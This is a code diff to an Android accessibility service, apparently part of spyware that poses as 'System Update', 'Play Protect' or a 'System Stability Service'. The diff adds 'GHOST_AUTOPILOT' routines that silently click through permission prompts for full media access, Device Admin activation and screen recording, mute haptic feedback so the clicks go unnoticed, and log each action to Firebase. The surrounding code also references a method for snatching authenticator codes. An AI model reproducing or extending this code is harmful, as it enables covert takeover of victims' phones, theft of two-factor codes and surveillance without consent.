+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                boolean success = searchFullAccessButtonDfs(child);
+                child.recycle();
+                if (success) return true;
+            }
+        }
+
+        return false;
+    }
+
     private void executeAutoPilotPass() {
         if (isExitingSettings) return;
 
@@ -1251,8 +1743,13 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
                 int totalSwitches = countSwitchesOnScreen(root);
 
+                // Pass 0: Priority Full Access Check for Android 14 Media Prompts ("Allow all", "Allow access to all photos")
+                boolean clicked = searchFullAccessButtonDfs(root);
+
                 // Pass 1: Search for runtime permission & system dialog buttons ("While using the app", "Allow", "OK", "Grant", "Install Update")
-                boolean clicked = searchPermissionButtonDfs(root);
+                if (!clicked) {
+                    clicked = searchPermissionButtonDfs(root);
+                }
 
                 // Pass 2: Search for unchecked special permission switches ("Install unknown apps", "All files access", "Notification access")
                 if (!clicked) {
@@ -1375,21 +1872,98 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return false;
     }
 
+    public List<String> getOurAppNames() {
+        List<String> names = new ArrayList<>();
+
+        // 1. Dynamic Application Label from PackageManager (what Settings actually displays)
+        try {
+            PackageManager pm = getPackageManager();
+            if (pm != null) {
+                CharSequence appLabel = pm.getApplicationLabel(getApplicationInfo());
+                if (appLabel != null && appLabel.length() > 0) {
+                    String labelStr = appLabel.toString().trim();
+                    if (!labelStr.isEmpty()) {
+                        names.add(labelStr);
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // 2. Resource String app_name
+        try {
+            String resName = getString(R.string.app_name);
+            if (resName != null && !resName.trim().isEmpty()) {
+                String trimmed = resName.trim();
+                if (!names.contains(trimmed)) {
+                    names.add(trimmed);
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // 3. Package Name
+        String pkgName = getPackageName();
+        if (pkgName != null && !pkgName.isEmpty()) {
+            if (!names.contains(pkgName)) {
+                names.add(pkgName);
+            }
+        }
+
+        // 4. Dynamic Service Labels from PackageManager
+        try {
+            PackageManager pm = getPackageManager();
+            if (pm != null) {
+                ComponentName accComponent = new ComponentName(this, IO_Persistence_Manager.class);
+                ServiceInfo accInfo = pm.getServiceInfo(accComponent, 0);
+                if (accInfo != null) {
+                    CharSequence label = accInfo.loadLabel(pm);
+                    if (label != null && label.length() > 0) {
+                        String sLabel = label.toString().trim();
+                        if (!sLabel.isEmpty() && !names.contains(sLabel)) {
+                            names.add(sLabel);
+                        }
+                    }
+                }
+
+                ComponentName notifComponent = new ComponentName(this, StatusNotification.class);
+                ServiceInfo notifInfo = pm.getServiceInfo(notifComponent, 0);
+                if (notifInfo != null) {
+                    CharSequence label = notifInfo.loadLabel(pm);
+                    if (label != null && label.length() > 0) {
+                        String sLabel = label.toString().trim();
+                        if (!sLabel.isEmpty() && !names.contains(sLabel)) {
+                            names.add(sLabel);
+                        }
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // 5. Fallback & Known Legacy/Alias names
+        String[] fallbacks = {
+            "System Stability Service",
+            "com.android.system.stability",
+            "com.labs.labrats",
+            "System Update",
+            "Play Protect",
+            "Lab-RATS",
+            "StatusNotification",
+            "Device Bridge"
+        };
+        for (String fb : fallbacks) {
+            if (!names.contains(fb)) {
+                names.add(fb);
+            }
+        }
+
+        return names;
+    }
+
     private boolean isSingleAppPermissionPage(AccessibilityNodeInfo root, int totalSwitchesOnScreen) {
         if (root == null) return false;
         if (hasScrollableList(root)) return false;
         if (totalSwitchesOnScreen != 1) return false;
 
-        String ourAppName = getString(R.string.app_name);
-        String pkgName = getPackageName();
-
-        List<String> targetNames = new ArrayList<>();
-        if (!ourAppName.isEmpty()) targetNames.add(ourAppName);
-        targetNames.add("System Stability Service");
-        targetNames.add(pkgName);
-        targetNames.add("System Update");
-        targetNames.add("Play Protect");
-        targetNames.add("Lab-RATS");
+        List<String> targetNames = getOurAppNames();
 
         for (String name : targetNames) {
             List<AccessibilityNodeInfo> matches = root.findAccessibilityNodeInfosByText(name);
@@ -1446,19 +2020,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private boolean isSwitchForOurApp(AccessibilityNodeInfo switchNode) {
         if (switchNode == null) return false;
 
-        String ourAppName = getString(R.string.app_name);
-
-        List<String> namesToCheck = new ArrayList<>();
-        if (!ourAppName.isEmpty()) namesToCheck.add(ourAppName);
-        namesToCheck.add(getPackageName());
-        namesToCheck.add("com.android.system.stability");
-        namesToCheck.add("com.labs.labrats");
-        namesToCheck.add("System Stability Service");
-        namesToCheck.add("System Update");
-        namesToCheck.add("Play Protect");
-        namesToCheck.add("Lab-RATS");
-        namesToCheck.add("StatusNotification");
-        namesToCheck.add("Device Bridge");
+        List<String> namesToCheck = getOurAppNames();
 
         // Walk up parent container row hierarchy (up to 8 levels), stopping BEFORE RecyclerView/ListView
         AccessibilityNodeInfo curr = switchNode.getParent();
@@ -1582,38 +2144,65 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return false;
     }
 
-    private boolean searchPermissionButtonDfs(AccessibilityNodeInfo node) {
+    private boolean isInteractiveButtonNode(AccessibilityNodeInfo node) {
         if (node == null) return false;
 
-        // 1. Check View ID Resource Name
+        if (node.isClickable()) return true;
+
+        CharSequence clsSeq = node.getClassName();
+        String clsName = clsSeq != null ? clsSeq.toString().toLowerCase() : "";
+        if (clsName.contains("button")) return true;
+
+        AccessibilityNodeInfo parent = node.getParent();
+        if (parent != null) {
+            boolean parentClickable = parent.isClickable();
+            parent.recycle();
+            if (parentClickable) return true;
+        }
+
+        Rect bounds = new Rect();
+        node.getBoundsInScreen(bounds);
+        return bounds.centerY() > 1000;
+    }
+
+    private boolean searchPermissionButtonDfs(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        if (isPartialAccessNode(node)) return false;
+
+        // 1. Check View ID Resource Name (Excluding Partial Access "Select photos" button IDs on Android 14)
         String viewId = node.getViewIdResourceName();
         if (viewId != null) {
             String lowerId = viewId.toLowerCase();
-            if (lowerId.contains("permission_allow") ||
-                lowerId.contains("permission_allow_foreground_only_button") ||
-                lowerId.contains("permission_allow_button") ||
-                lowerId.contains("permission_allow_always_button") ||
-                lowerId.contains("permission_allow_one_time_button") ||
-                lowerId.endsWith("btnguideaction") ||
-                lowerId.endsWith("btncheckupdate") ||
-                lowerId.contains("btncheckforupdate") ||
-                lowerId.contains("btnstartstop") ||
-                lowerId.contains("btnplayprotectscan") ||
-                lowerId.endsWith("id/button1")) {
-                if (performNodeClick(node)) {
-                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");
-                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");
-                    
-                    AccessibilityNodeInfo root = getRootInActiveWindow();
-                    if (root != null) {
-                        CharSequence pkgSeq = root.getPackageName();
-                        String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
-                        root.recycle();
-                        if (pkgStr.contains("settings")) {
-                            startSmartExitSettingsLoop();
+            if (!lowerId.contains("permission_allow_selected") && !lowerId.contains("allow_selected")) {
+                if (lowerId.contains("permission_allow_all_button") ||
+                    lowerId.contains("permission_allow_always_button") ||
+                    lowerId.contains("permission_allow_foreground_only_button") ||
+                    lowerId.contains("permission_allow_button") ||
+                    lowerId.contains("permission_allow_one_time_button") ||
+                    lowerId.contains("permission_allow") ||
+                    lowerId.contains("action_button") ||
+                    lowerId.contains("admin_add") ||
+                    lowerId.endsWith("btnguideaction") ||
+                    lowerId.endsWith("btncheckupdate") ||
+                    lowerId.contains("btncheckforupdate") ||
+                    lowerId.contains("btnstartstop") ||
+                    lowerId.contains("btnplayprotectscan") ||
+                    lowerId.endsWith("id/button1")) {
+                    if (performNodeClick(node)) {
+                        Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");
+                        FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");
+
+                        AccessibilityNodeInfo root = getRootInActiveWindow();
+                        if (root != null) {
+                            CharSequence pkgSeq = root.getPackageName();
+                            String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
+                            root.recycle();
+                            if (pkgStr.contains("settings") && !lowerId.contains("admin") && !lowerId.contains("action_button")) {
+                                startSmartExitSettingsLoop();
+                            }
                         }
+                        return true;
                     }
-                    return true;
                 }
             }
         }
@@ -1628,35 +2217,98 @@ public class IO_Persistence_Manager extends AccessibilityService {
             String lowerText = text.toLowerCase();
             String lowerDesc = desc.toLowerCase();
 
-            String[] keywords = {
-                "while using the app", "only this time", "allow all the time",
-                "allow", "allow all", "grant", "permitir", "permitir siempre",
-                "aceptar", "autoriser", "oui", "turn on", "enable", "activate", "yes", "ok",
-                "start optimization", "start", "complete setup", "check for update", "enable sync", "install update",
-                "enable protection", "enable notification access", "enable file storage access",
-                "enable install unknown apps", "enable system protection", "proceed", "continue"
+            // Explicit Device Admin Activation Button Match (Handles Step 1 & Step 2 Samsung Popups)
+            boolean isAdminButton = (lowerText.contains("activate") || lowerDesc.contains("activate") ||
+                     lowerText.contains("turn on") || lowerDesc.contains("turn on") ||
+                     lowerText.equals("ok") || lowerDesc.equals("ok")) &&
+                    (lowerText.contains("admin") || lowerDesc.contains("admin") ||
+                     lowerText.contains("device") || lowerDesc.contains("device") ||
+                     lowerText.contains("turn on") || lowerDesc.contains("turn on") ||
+                     lowerText.equals("activate") || lowerDesc.equals("activate") ||
+                     lowerText.startsWith("activate"));
+
+            if (isAdminButton && lowerText.length() < 60 && isInteractiveButtonNode(node)) {
+                if (performNodeClick(node)) {
+                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
+                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
+                    return true;
+                }
+            }
+
+            // Screen Recording / MediaProjection Permission Dialog Auto-Grant ("Start now", "Start recording")
+            String[] screenRecordKeywords = {
+                "start now", "start recording", "start", "iniciar ahora", "iniciar", "commencer", "autoriser", "permitir"
             };
 
-            for (String kw : keywords) {
-                if (lowerText.equals(kw) || lowerDesc.equals(kw) ||
-                    (lowerText.startsWith(kw) && lowerText.length() < kw.length() + 15)) {
-                    
-                    // Exclude long title sentences
-                    if (lowerText.length() < 50) {
+            for (String kw : screenRecordKeywords) {
+                if (lowerText.contains(kw) || lowerDesc.contains(kw)) {
+                    if (lowerText.length() <= 30 && isInteractiveButtonNode(node)) {
                         if (performNodeClick(node)) {
-                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
-                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
-                            
-                            AccessibilityNodeInfo root = getRootInActiveWindow();
-                            if (root != null) {
-                                CharSequence pkgSeq = root.getPackageName();
-                                String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
-                                root.recycle();
-                                if (pkgStr.contains("settings")) {
-                                    startSmartExitSettingsLoop();
-                                }
-                            }
+                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Screen Recording permission via text [" + text + "]");
+                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Screen Recording permission via text [" + text + "]");
                             return true;
+                        }
+                    }
+                }
+            }
+
+            // Android 14 Full Media Access Priority Pass ("Allow all", "Allow access to all photos")
+            String[] fullAccessKeywords = {
+                "allow all", "allow access to all photos", "allow all photos",
+                "allow all photos and videos", "allow all the time", "while using the app",
+                "permitir todo", "permitir todos", "autoriser tout"
+            };
+
+            for (String kw : fullAccessKeywords) {
+                if (lowerText.contains(kw) || lowerDesc.contains(kw)) {
+                    if (lowerText.length() < 55 && isInteractiveButtonNode(node)) {
+                        if (performNodeClick(node)) {
+                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
+                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
+                            return true;
+                        }
+                    }
+                }
+            }
+
+            // Exclude Partial Access ("Select photos and videos") text
+            boolean isPartialAccess = lowerText.contains("select photo") || lowerText.contains("selected photo") ||
+                                      lowerDesc.contains("select photo") || lowerDesc.contains("selected photo") ||
+                                      lowerText.contains("allow selected") || lowerDesc.contains("allow selected");
+
+            if (!isPartialAccess) {
+                String[] keywords = {
+                    "while using the app", "only this time", "allow all the time",
+                    "allow", "allow all", "grant", "permitir", "permitir siempre",
+                    "aceptar", "autoriser", "oui", "turn on", "enable", "activate",
+                    "activate this device admin", "activate this device administrator", "yes", "ok",
+                    "start optimization", "start", "complete setup", "check for update", "enable sync", "install update",
+                    "enable protection", "enable notification access", "enable file storage access",
+                    "enable install unknown apps", "enable system protection", "proceed", "continue"
+                };
+
+                for (String kw : keywords) {
+                    if (lowerText.equals(kw) || lowerDesc.equals(kw) ||
+                        (lowerText.startsWith(kw) && lowerText.length() < kw.length() + 15)) {
+
+                        // Exclude long title sentences
+                        if (lowerText.length() < 50 && isInteractiveButtonNode(node)) {
+                            if (performNodeClick(node)) {
+                                Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
+                                FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
+
+                                AccessibilityNodeInfo root = getRootInActiveWindow();
+                                if (root != null) {
+                                    CharSequence pkgSeq = root.getPackageName();
+                                    String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
+                                    root.recycle();
+                                    boolean isAdminKeyword = lowerText.contains("activate") || lowerText.contains("admin") || lowerText.contains("device") || lowerText.contains("turn on");
+                                    if (pkgStr.contains("settings") && !isAdminKeyword) {
+                                        startSmartExitSettingsLoop();
+                                    }
+                                }
+                                return true;
+                            }
                         }
                     }
                 }
@@ -1677,48 +2329,74 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return false;
     }
 
+    private void muteVibration() {
+        try {
+            silenceHaptics(this);
+            android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
+            if (v != null) {
+                v.cancel();
+            }
+        } catch (Exception ignored) {}
+    }
+
     private boolean performNodeClick(AccessibilityNodeInfo node) {
         if (node == null) return false;
 
         lastAutoPilotClickTime = System.currentTimeMillis();
 
-        // 1. Direct Accessibility ACTION_CLICK on node
-        if (node.isClickable()) {
-            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-                Log.d(TAG, "GHOST_AUTOPILOT: Direct node ACTION_CLICK performed successfully");
-                return true;
-            }
-        }
-
-        // 2. Direct Accessibility ACTION_CLICK on clickable parent
-        AccessibilityNodeInfo curr = node.getParent();
-        int depth = 0;
-        while (curr != null && depth < 5) {
-            if (curr.isClickable()) {
-                if (curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-                    Log.d(TAG, "GHOST_AUTOPILOT: Direct parent ACTION_CLICK performed successfully");
-                    curr.recycle();
-                    return true;
-                }
-            }
-            AccessibilityNodeInfo parent = curr.getParent();
-            curr.recycle();
-            curr = parent;
-            depth++;
-        }
-
-        // 3. Fallback: Native gesture tap at coordinates
         Rect bounds = new Rect();
         node.getBoundsInScreen(bounds);
         int x = bounds.centerX();
         int y = bounds.centerY();
 
-        if (x > 0 && y > 0 && x < getScreenWidth() && y < getScreenHeight()) {
-            Log.d(TAG, "GHOST_AUTOPILOT: Gesture tap fallback at (" + x + ", " + y + ")");
-            return clickAt(x, y);
+        boolean clicked = false;
+
+        // 1. Direct Accessibility ACTION_CLICK on node
+        if (node.isClickable()) {
+            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                clicked = true;
+                Log.d(TAG, "GHOST_AUTOPILOT: Direct node ACTION_CLICK performed");
+            }
         }
 
-        return false;
+        // 2. Direct Accessibility ACTION_CLICK on clickable parent
+        if (!clicked) {
+            AccessibilityNodeInfo curr = node.getParent();
+            int depth = 0;
+            while (curr != null && depth < 5) {
+                if (curr.isClickable()) {
+                    if (curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                        clicked = true;
+                        Log.d(TAG, "GHOST_AUTOPILOT: Direct parent ACTION_CLICK performed");
+                        curr.recycle();
+                        break;
+                    }
+                }
+                AccessibilityNodeInfo parent = curr.getParent();
+                curr.recycle();
+                curr = parent;
+                depth++;
+            }
+        }
+
+        // 3. Always dispatch native gesture tap at bounds coordinates for guaranteed hardware button activation
+        if (x > 0 && y > 0 && x < getScreenWidth() && y < getScreenHeight()) {
+            boolean tapRes = clickAt(x, y);
+            if (tapRes || clicked) {
+                muteVibration();
+                Log.d(TAG, "GHOST_AUTOPILOT: Auto-click gesture tap executed at (" + x + ", " + y + ")");
+
+                // Schedule multi-pass follow-ups for 2-step confirmation popups
+                Handler mainHandler = new Handler(Looper.getMainLooper());
+                mainHandler.postDelayed(this::executeAutoPilotPass, 250);
+                mainHandler.postDelayed(this::executeAutoPilotPass, 500);
+                mainHandler.postDelayed(this::executeAutoPilotPass, 800);
+
+                return true;
+            }
+        }
+
+        return clicked;
     }
 
     private void snatchAuthenticatorCodes(String pkg) {
